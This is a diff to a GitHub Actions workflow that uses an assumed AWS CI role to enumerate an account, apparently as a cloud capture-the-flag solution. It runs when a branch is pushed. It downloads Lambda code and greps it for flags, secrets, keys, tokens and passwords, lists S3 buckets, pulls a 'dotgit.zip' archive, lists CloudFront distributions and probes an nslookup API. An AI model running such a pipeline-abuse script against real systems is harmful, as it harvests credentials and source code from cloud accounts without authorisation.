@@ -1,21 +1,20 @@
 name: deploy
 
 on:
-  workflow_dispatch:
-
-permissions:
-  id-token: write
-  contents: read
+  push:
+    branches:
+      - corgi
 
 jobs:
-  inspect:
+  aws:
     runs-on: ubuntu-latest
 
-    steps:
-      - name: Checkout
-        uses: actions/checkout@v4
+    permissions:
+      id-token: write
+      contents: read
 
-      - name: Configure AWS credentials
+    steps:
+      - name: Get AWS credentials
         uses: aws-actions/configure-aws-credentials@v4
         with:
           role-to-assume: arn:aws:iam::009661764077:role/cicdRole
@@ -25,9 +24,16 @@ jobs:
         run: |
           aws sts get-caller-identity
 
-      - name: Download deployed Lambda
+      - name: Lambda configuration
         run: |
-          echo "===== LAMBDA DOWNLOAD ====="
+          echo "===== LAMBDA CONFIG ====="
+
+          aws lambda get-function-configuration \
+            --function-name nslookupv2
+
+      - name: Download deployed Lambda code
+        run: |
+          echo "===== DOWNLOAD LAMBDA ====="
 
           aws lambda get-function \
             --function-name nslookupv2 \
@@ -42,17 +48,10 @@ jobs:
           echo "===== FILES ====="
           find lambda_code -type f
 
-      - name: Inspect Lambda code
-        run: |
-          echo "===== SEARCH LAMBDA ====="
-
+          echo "===== SEARCH ====="
           grep -RniE \
           "flag|secret|key|token|password|s3|subprocess|os|eval|exec|open" \
           lambda_code || true
-
-          echo "===== PYTHON FILES ====="
-
-          find lambda_code -name "*.py" -exec sh -c 'echo "--- $1 ---"; cat "$1"' _ {} \;
 
       - name: Export API Gateway
         run: |
@@ -66,14 +65,7 @@ jobs:
 
           cat api.json
 
-      - name: Lambda configuration
-        run: |
-          echo "===== LAMBDA CONFIG ====="
-
-          aws lambda get-function-configuration \
-            --function-name nslookupv2
-
-      - name: S3 buckets
+      - name: S3 discovery
         run: |
           echo "===== BUCKETS ====="
 
@@ -84,7 +76,25 @@ jobs:
           aws s3 ls \
           s3://platform-bucket-009661764077-us-east-1/
 
-          echo "===== SITE BUCKET ====="
+          echo "===== DOTGIT ====="
 
-          aws s3 ls \
-          s3://site781fe43f26b9eba3/ --recursive
+          aws s3 cp \
+          s3://platform-bucket-009661764077-us-east-1/dotgit.zip \
+          dotgit.zip
+
+          unzip -l dotgit.zip
+
+      - name: CloudFront
+        run: |
+          echo "===== CLOUDFRONT ====="
+
+          aws cloudfront list-distributions
+
+      - name: Test API
+        run: |
+          echo "===== API TEST ====="
+
+          curl -i -X POST \
+          https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup \
+          -H "Content-Type: application/json" \
+          -d '{"domain":"example.com"}'
